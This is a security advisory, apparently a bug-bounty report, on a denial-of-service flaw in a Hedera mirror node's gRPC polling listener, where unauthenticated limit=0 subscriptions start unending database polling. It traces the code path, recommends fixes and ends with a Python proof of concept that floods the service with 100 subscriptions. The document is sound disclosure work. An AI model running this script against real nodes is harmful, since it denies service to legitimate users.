### Title
Unbounded Infinite DB Polling Loop via Unauthenticated `limit=0` gRPC Subscription in `PollingTopicListener`

### Summary
When the gRPC listener is configured with `type=POLL`, any unauthenticated client can subscribe to a topic with `limit=0` (the protobuf default for `uint64`) and a historical `startTime`. This causes `PollingTopicListener.listen()` to schedule `RepeatSpec.times(Long.MAX_VALUE)` DB queries at every polling interval with no termination condition, running indefinitely. An attacker opening multiple such subscriptions can exhaust the database connection pool and deny service to all other users.

### Finding Description

**Exact code path:**

`ConsensusController.toFilter()` maps the incoming gRPC `ConsensusTopicQuery` directly:

```java
// ConsensusController.java:56
final var filter = TopicMessageFilter.builder().limit(query.getLimit());
```

A protobuf `uint64` field defaults to `0` when not set, so `limit=0` is passed through without rejection.

`TopicMessageFilter.hasLimit()` treats `0` as "no limit":

```java
// TopicMessageFilter.java:39-41
public boolean hasLimit() {
    return limit > 0;
}
```

`TopicMessageServiceImpl.incomingMessages()` propagates `limit=0` to the listener:

```java
// TopicMessageServiceImpl.java:115-118
long limit = filter.hasLimit() ? filter.getLimit() - topicContext.getCount().get() : 0;
var newFilter = filter.toBuilder().limit(limit).startTime(startTime).build();
return topicListener.listen(newFilter).concatMap(t -> missingMessages(topicContext, t));
```

`PollingTopicListener.listen()` then creates an infinite repeat loop:

```java
// PollingTopicListener.java:38-43
return Flux.defer(() -> poll(context))
        .delaySubscription(interval, scheduler)
        .repeatWhen(RepeatSpec.times(Long.MAX_VALUE)
                .jitter(0.1)
                .withFixedDelay(interval)
                .withScheduler(scheduler))
```

`Long.MAX_VALUE` Ōēł 9.2 ├Ś 10┬╣ŌüĖ iterations. With the default `interval=500ms`, this fires ~2 DB queries per second per subscription, forever.

Inside `poll()`, because `filter.hasLimit()` is false, `limit` is set to `Integer.MAX_VALUE` and capped only by `maxPageSize` (default 5000):

```java
// PollingTopicListener.java:54-57
int limit = filter.hasLimit()
        ? (int) (filter.getLimit() - context.getCount().get())
        : Integer.MAX_VALUE;
int pageSize = Math.min(limit, listenerProperties.getMaxPageSize());
```

Each poll executes a full JPA query via `TopicMessageRepositoryCustomImpl.findByFilter()`, calling `typedQuery.getResultList()` (blocking, loads up to 5000 rows into memory), holding a DB connection for the duration of each query.

There is **no `isComplete()` check** in `PollingTopicListener` ŌĆö unlike `PollingTopicMessageRetriever` which has explicit termination logic. The loop never self-terminates.

**Root cause:** `RepeatSpec.times(Long.MAX_VALUE)` with no termination predicate, combined with `limit=0` being a valid, unauthenticated input that bypasses `hasLimit()`.

### Impact Explanation

Each attacker subscription generates ~2 DB queries/second indefinitely, each potentially fetching 5000 rows. The HikariCP connection pool (typically 10ŌĆō20 connections by default) is shared across all gRPC subscribers and the importer. With even a handful of concurrent malicious subscriptions, legitimate queries queue up and time out (`statementTimeout=10000ms`), causing complete service unavailability for all other subscribers. The attack is amplified because `maxConcurrentCallsPerConnection=5` allows 5 simultaneous subscriptions per attacker connection, and there is no global subscriber cap ŌĆö only a metric gauge (`subscriberCount`) with no enforcement.

### Likelihood Explanation

The attack requires zero authentication, zero knowledge of the system internals, and only a standard gRPC client. The `limit=0` value is the protobuf default ŌĆö a client that simply omits the `limit` field triggers the vulnerability. The `startTime` only needs to be any past timestamp (including epoch `0`), which is explicitly allowed by `isValidStartTime()`. The attack is trivially scriptable: open N connections, each with 5 subscriptions, and the DB pool is saturated within seconds. The `POLL` listener type is a documented, supported configuration option.

### Recommendation

1. **Add a termination predicate to the repeat loop** ŌĆö check if the subscription should still be active before each repeat, similar to `PollingTopicMessageRetriever.PollingContext.isComplete()`.
2. **Enforce a maximum concurrent subscriber count** ŌĆö convert the `subscriberCount` gauge into an enforced limit that rejects new subscriptions when exceeded.
3. **Rate-limit subscriptions per remote address** ŌĆö reject clients that open more than N subscriptions within a time window.
4. **Treat `limit=0` as a sentinel requiring explicit opt-in** ŌĆö require clients to pass a non-zero limit or a specific "unlimited" flag that is rate-limited or requires elevated privilege.
5. **Cap the repeat count** ŌĆö replace `Long.MAX_VALUE` with a configurable maximum (e.g., `maxPolls`) as `PollingTopicMessageRetriever` does for unthrottled mode.

### Proof of Concept

```python
import grpc
from hedera import consensus_service_pb2, consensus_service_pb2_grpc
from hedera import timestamp_pb2, basic_types_pb2

# Open many connections to amplify the attack
channels = [grpc.insecure_channel("mirror-node:5600") for _ in range(20)]

for channel in channels:
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    query = consensus_service_pb2.ConsensusTopicQuery(
        topicID=basic_types_pb2.TopicID(topicNum=1),
        # limit omitted ŌåÆ defaults to 0 (no limit)
        consensusStartTime=timestamp_pb2.Timestamp(seconds=0, nanos=0),  # epoch
    )
    # Open 5 subscriptions per connection (maxConcurrentCallsPerConnection default)
    for _ in range(5):
        stub.subscribeTopic(query)  # non-blocking, starts infinite polling

# Result: 20 * 5 = 100 concurrent infinite polling loops
# Each fires a DB query every 500ms ŌåÆ 200 DB queries/second
# DB connection pool (default ~10-20) exhausted within seconds
# All legitimate subscribers receive timeout errors
```
